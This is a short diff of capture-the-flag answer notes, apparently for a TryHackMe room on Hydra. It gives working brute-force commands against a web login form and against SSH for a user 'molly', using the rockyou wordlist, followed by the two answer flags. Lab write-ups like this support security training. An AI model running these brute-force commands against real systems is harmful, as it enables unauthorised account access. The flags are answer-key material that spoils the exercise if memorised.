@@ -1,0 +1,4 @@
+++Use Hydra to bruteforce molly's web password. What is flag 1? (hydra -l molly -P /usr/share/wordlists/rockyou.txt @ip http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V -f)
+THM{2673a7dd116de68e85c48ec0b1f2612e}
+++Use Hydra to bruteforce molly's SSH password. What is flag 2? (hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://@IP -V -f , ssh molly@IP)
+THM{c8eeb0468febbadea859baeb33b2541b}
